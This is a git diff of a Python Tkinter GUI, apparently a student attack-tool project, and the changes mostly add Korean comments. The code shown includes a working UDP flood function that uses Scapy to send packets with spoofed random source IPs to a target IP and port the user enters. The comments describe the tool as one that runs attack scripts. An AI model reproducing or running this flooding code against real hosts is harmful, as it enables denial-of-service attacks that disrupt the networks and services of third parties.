@@ -14,11 +14,11 @@ class GUIMODE():
         win.geometry("800x600")
         win.resizable(False, False)
 
-        right_frame = tkinter.Frame(win, relief="groove", bd=1)# 공격문의 상세설명창을 띄우는 
-        left_frame = tkinter.Frame(win, relief="groove", bd=1)# 
+        right_frame = tkinter.Frame(win, relief="groove", bd=1)# 공격문의 상세설명창을 띄우는 창을 생성
+        left_frame = tkinter.Frame(win, relief="groove", bd=1)# 공격문의 실행과 버튼 창을 생성
 
-        right_frame.pack(side="right", fill="both", expand=True)#
-        left_frame.pack(side="left", fill="both", expand=True)#
+        right_frame.pack(side="right", fill="both", expand=True)
+        left_frame.pack(side="left", fill="both", expand=True)
 
         self.ip_dst_data = tkinter.StringVar()
 
@@ -141,17 +141,17 @@ class GUIMODE():
     def udp_flood(self): # udp flood 정재훈
         dst_ip = self.ip_dst_data.get()
         duration = 100
-        timeout = time.time() + duration
+        timeout = time.time() + duration #공격시간 초과여부를 timeout 변수로 저장
         sent = 0
 
         for i in range(self.count):
-            if time.time() > timeout:
+            if time.time() > timeout:    #설정한 공격시간이 지나면 종료
                 break
-            else:
+            else:                        #지나지 않으면 아래의 내용 반복
                 pass
-            _ip = IP(src=RandIP(), dst=dst_ip)
-            _udp = UDP(sport=self.s_port, dport=self.dst_port)
-            send(_ip / _udp, verbose=0)
+            _ip = IP(src=RandIP(), dst=dst_ip) #출발IP 무작위 설정 / 목적지 아이피 설정
+            _udp = UDP(sport=self.s_port, dport=self.dst_port) #출발포트 무작위 설정 / 목적지 포트 설정
+            send(_ip / _udp, verbose=0)  #생성한 임의의 IP 설정으로 패킷 전송
             sent += 1
             print("UDP_Flooding_Attack Start: " + str(
                 sent) + " sent packages " + dst_ip + " At the Port " + str(self.dst_port))
